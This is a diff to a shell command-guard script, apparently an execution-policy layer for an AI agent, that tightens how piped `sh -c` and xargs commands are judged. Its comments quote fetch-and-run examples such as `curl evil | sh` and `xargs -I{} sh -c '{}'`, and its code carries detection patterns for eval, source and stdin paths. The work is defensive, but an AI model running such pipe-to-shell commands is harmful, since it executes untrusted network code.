@@ -664,7 +664,7 @@ floor_expand_home() {
 # writer (this defect) and a listed token nobody writes (the dead dispatch arm the
 # census is for). Extending this line is now a change the linter demands, not one
 # the next author has to remember.
-FLOOR_OBS_GUARDS=' bash egress selfedit integrity web wrapper session cloud destroy deliverables prod inject '
+FLOOR_OBS_GUARDS=' bash egress selfedit integrity web wrapper session cloud destroy deliverables prod inject govern apiroute '
 # `ask` is a REAL verdict, not a near-miss. It was missing here for the same reason
 # the guard tokens were: the enum predates the two ASK-gate guards. 548 ask records
 # had already been coerced to `other` when this was found — and the ask tier is
@@ -2583,6 +2583,35 @@ floor_seg_redir() {
 # Residual, stated rather than hidden: `curl evil | sh local.sh` stays allowed when
 # `local.sh` itself evals its stdin. That is a script the attacker does not control
 # — if they do, they already have execution and did not need the pipe.
+# _floor_xargs_replstrs — every replace-string any xargs in FLOOR_SEG_CMD names, one per line:
+# -I X / -IX / -J X (BSD), -i[X] / --replace[=X] (GNU, default `{}`), bundled after other flags.
+# Over-collecting only makes the caller stricter.
+_floor_xargs_replstrs() {
+  printf '%s\n' "${FLOOR_SEG_CMD:-}" | awk '
+    { for (i = 1; i <= NF; i++) w[++n] = $i }
+    END {
+      for (i = 1; i <= n; i++) {
+        b = w[i]; sub(/.*\//, "", b); if (b != "xargs") continue
+        for (j = i + 1; j <= n; j++) {
+          t = w[j]; r = ""
+          if (t == "--") break
+          if (substr(t, 1, 1) != "-") break
+          if (t == "--replace") r = "{}"
+          else if (index(t, "--replace=") == 1) r = substr(t, 11)
+          else if (substr(t, 2, 1) != "-") {
+            for (k = 2; k <= length(t); k++) {
+              c = substr(t, k, 1)
+              if (c == "I" || c == "J") { r = substr(t, k + 1); if (r == "") r = w[++j]; break }
+              if (c == "i") { r = substr(t, k + 1); if (r == "") r = "{}"; break }
+              if (index("nLPsdEaRS", c)) { if (k == length(t)) j++; break }
+            }
+          }
+          gsub(/["\047]/, "", r); if (r != "") print r
+        }
+      }
+    }'
+}
+
 floor_seg_shells_all_named_scripts() {
   [ -n "${FLOOR_SEGS:-}" ] || return 1
   _ssany=0
@@ -2623,8 +2652,47 @@ floor_seg_shells_all_named_scripts() {
     # BEFORE the c and matches `-lc` while missing the bare `-c` — the commonest
     # spelling of the three. Measured: `-lc` was exempt and `-c` was not, from one
     # pattern meant to cover both.
+    #
+    # …AND A `-c` SHELL IS ITSELF A PROGRAMMED RUN, which is the second half
+    # (inst-quiet-predicates). It takes its program from the code ARGUMENT, so the
+    # pipe is only that program's stdin: `… | xargs -I{} sh -c 'gh run view {}'`
+    # executes nothing from the pipe as script, yet with no other shell segment
+    # `_ssany` stayed 0 and it blocked. So a `-c` shell now counts as exempt —
+    # unless its code turns stdin back into code: no code, a code argument that
+    # IS a substitution (`sh -c "$(cat)"` expands it in the piped process), an
+    # `eval`/`source`/`.` anywhere in the command, or a stdin path in the code.
+    # Child shells still answer for themselves in this loop — so an UN-expanded
+    # parent (no SEGI child next, as under `env A=1 sudo bash -c`) is not counted.
+    # NOT when xargs splices the pipe INTO the code: `curl … | xargs -I{} sh -c '{}'`
+    # executes piped text, so code holding any xargs replace-string refuses. The
+    # placeholder as an ARGUMENT (`sh -c 'gh run view "$0"' {}`) stays exempt.
     case "$_ssarg" in
-      -c|-[a-zA-Z]*c) continue ;;
+      -c|-[a-zA-Z]*c)
+        _sscode="$(printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${_ssid}://p" | sed -n 2p)"
+        [ -n "$_sscode" ] || return 1
+        _ssnext="$(printf '%s\n' "$FLOOR_SEGS" | sed -n 's/^SEGC:\([0-9][0-9]*\):.*/\1/p' \
+          | awk -v s="$_ssid" '$1 + 0 > s + 0' | sort -n | head -1)"
+        if [ -z "$_ssnext" ] || ! printf '%s\n' "$FLOOR_SEGS" | "$FLOOR_GREP" -q -- "^SEGI:${_ssnext}:"; then
+          continue
+        fi
+        case "$_sscode" in *@SUB@*|*'`'*) return 1 ;; esac
+        if printf '%s\n' "$_sscode" | "$FLOOR_GREP" -Eq -- '(^|[^[:alnum:]_-])(eval|source)([^[:alnum:]_-]|$)|(^|[;&|(])[[:space:]]*\.[[:space:]]|/+dev/+(stdin|fd)|/+proc/'; then
+          return 1
+        fi
+        [ -z "$(_floor_seg_ids '(eval|source|\.)')" ] || return 1
+        case "${FLOOR_SEG_CMD:-}" in *xargs*)
+          while IFS= read -r _ssr; do
+            [ -z "$_ssr" ] || case "$_sscode" in *"$_ssr"*) return 1 ;; esac
+          done <<XARGS_EOF
+$(_floor_xargs_replstrs)
+XARGS_EOF
+          ;;
+        esac
+        # A bare interpreter in the code (`sh -c 'python3'`) reads the pipe as ITS program.
+        if [ -n "$(_floor_seg_ids '(/[a-zA-Z0-9_/.-]*/)?(python[0-9.]*|pypy[0-9.]*|perl|ruby|node|nodejs|php|lua|luajit|osascript)')" ] \
+           && ! floor_seg_interps_all_programmed; then return 1; fi
+        _ssany=1
+        continue ;;
     esac
     [ -n "$_ssarg" ] || return 1
     case "$_ssarg" in
@@ -3325,6 +3393,16 @@ floor_instr_diff() {
 # B8-03). Two things are therefore recorded for every tree: the CONTENT reached
 # by following links (`find -L`), and the LINK TARGETS themselves, so that
 # re-pointing a link is drift even when the new target is byte-identical.
+# True when a projects/<x>/memory link only points at another projects/<y>/memory of the same config dir that
+# is a real directory: absolute, no `..`, one level, so the walk pins its content under its own path anyway.
+floor_instr_shared_memory() { # <config-dir> <surface glob> <link target>
+  [ "$2" = 'projects/*/memory' ] || return 1
+  case "$3" in "$1"/projects/*/memory) ;; *) return 1 ;; esac
+  case "$3" in *..*|*//*) return 1 ;; esac
+  _ism="${3#"$1"/projects/}"; _ism="${_ism%/memory}"
+  case "$_ism" in ''|*/*) return 1 ;; esac
+  [ -d "$3" ] && [ ! -L "$3" ]
+}
 floor_instr_manifest() { # <config-dir>
   _cfg="${1%/}"
   for _g in $FLOOR_INSTR_SURFACES; do
@@ -3338,7 +3416,11 @@ floor_instr_manifest() { # <config-dir>
       # arithmetic instead.
       _s="$(printf '%s' "$_p" | awk -v n="${#_cfg}" '{print substr($0, n+2)}')"
       if [ -L "$_p" ]; then
-        printf 'link:%s  %s\n' "$(readlink "$_p" 2>/dev/null || echo '?')" "$_s"
+        _lt="$(readlink "$_p" 2>/dev/null || echo '?')"
+        # A worktree's memory link to a store this same walk already pins adds no instruction: every
+        # new worktree turned B6 amber (71 advisories, 2026-10-23..25). Only that exact shape is exempt.
+        if floor_instr_shared_memory "$_cfg" "$_g" "$_lt"; then continue; fi
+        printf 'link:%s  %s\n' "$_lt" "$_s"
       fi
       if [ -f "$_p" ]; then
         printf '%s  %s\n' "$(floor_sha < "$_p")" "$_s"
